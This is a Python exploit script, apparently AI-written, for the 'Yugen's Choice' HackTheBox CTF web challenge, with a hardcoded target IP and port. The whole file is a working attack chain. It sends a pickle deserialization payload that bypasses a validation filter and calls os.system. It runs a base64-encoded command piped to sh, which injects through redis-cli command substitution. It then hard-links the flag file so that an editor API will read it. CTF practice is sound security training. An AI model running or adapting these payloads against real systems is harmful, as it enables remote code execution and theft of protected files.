#!/usr/bin/env python3
"""
Yugen's Choice - Complete Working Exploit
Author: Assistant
Created: 2025-11-21
Updated: 2025-11-21 (after successful flag capture)

Challenge: Yugen's Choice (HackTheBox Neurogrid CTF 2025)
Category: Web
Difficulty: Medium
Points: 975

Attack Chain:
1. Pickle deserialization bypass using protocol 0 INST opcode with actual newlines
2. RCE via redis-cli direct write with command substitution
3. Create hard link to flag file in /app/main_app/
4. Read flag via editor API (runs as editor user with flag read permission)

Expected Result: HTB{7H3_7RU3_9U1D3_70_7H3_P1CKL3_W0RLD}
Actual Result: ✅ Flag captured successfully!
"""
import requests
import base64
import random
import string
import time
import json
from datetime import datetime, timezone

def exploit(target_host):
    """
    Complete exploit for Yugen's Choice challenge

    Args:
        target_host: Base URL of the challenge (e.g., http://IP:PORT/challenge)

    Returns:
        str: The flag content
    """
    HOST = target_host
    HEXGEN = string.digits + string.ascii_lowercase[:5]

    print("[*] Starting Yugen's Choice exploit...")

    # Step 1: Register and login
    session = requests.Session()
    username = "".join(random.choices(string.ascii_letters, k=20))
    password = "pass123"
    creds = {"username": username, "password": password}

    print(f"[+] Registering user: {username}")
    session.post(f"{HOST}/register", data=creds)
    session.post(f"{HOST}/login", data=creds)

    # Step 2: Create hard link using RCE
    print("[+] Creating hard link to flag file...")

    command = "ln /943e0ae4d35556e77ed8c25ead7a19e5.txt /app/main_app/flag_hardlink.txt 2>&1"
    time_done = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%f+00:00")
    job_id = ''.join(random.choices(HEXGEN, k=32))

    # Build Redis direct write command with command substitution
    JSON_DATA = {
        "id": job_id,
        "name": f"$({command})",
        "time_done": time_done,
        "status": "FINISHED"
    }
    JSON_STRING = json.dumps(JSON_DATA).replace('"', '\\"')
    redis_command = f'redis-cli -s /tmp/redis.sock SET "job:{job_id}:result" "{JSON_STRING}"'
    redis_encode = base64.b64encode(redis_command.encode()).decode()
    final_command = f"echo {redis_encode} | base64 -d | sh"

    # CRITICAL: Use actual newlines (not \n strings) to bypass pickle validation
    # The validation checks for b'i' string but pickle protocol 0 uses 'i' opcode + newline
    pickle_payload = f"(S'{final_command}'\nios\nsystem\n.".encode()
    payload = base64.b64encode(pickle_payload).decode()

    trigger_job_id = "".join(random.choices(HEXGEN, k=32))

    print("[+] Sending pickle payload for RCE...")
    session.post(f"{HOST}/backend", json={"id": trigger_job_id, "data": payload})

    # Wait for job processing
    time.sleep(3)

    # Step 3: Read flag via editor API
    print("[+] Reading flag via editor API...")

    # Extract base URL and port from challenge URL
    base_url = HOST.rsplit('/challenge', 1)[0]

    r = requests.get(
        f"{base_url}/editor_api/file",
        params={"path": "flag_hardlink.txt"},
        timeout=10
    )

    if r.status_code == 200:
        try:
            data = r.json()
            if "content" in data:
                flag = data["content"].strip()
                print(f"\n{'='*70}")
                print(f"✓✓✓ SUCCESS! FLAG CAPTURED! ✓✓✓")
                print(f"{'='*70}")
                print(f"Flag: {flag}")
                print(f"{'='*70}\n")
                return flag
            else:
                print(f"[!] Error: {data.get('error', 'Unknown error')}")
                return None
        except Exception as e:
            print(f"[!] Failed to parse response: {e}")
            print(f"[!] Raw response: {r.text[:200]}")
            return None
    else:
        print(f"[!] HTTP {r.status_code} error")
        return None

if __name__ == "__main__":
    # Update this URL for your challenge instance
    TARGET = "http://154.57.164.65:31602/challenge"

    flag = exploit(TARGET)

    if flag and "HTB{" in flag:
        print("[+] Exploit completed successfully!")
    else:
        print("[!] Exploit failed - flag not retrieved")
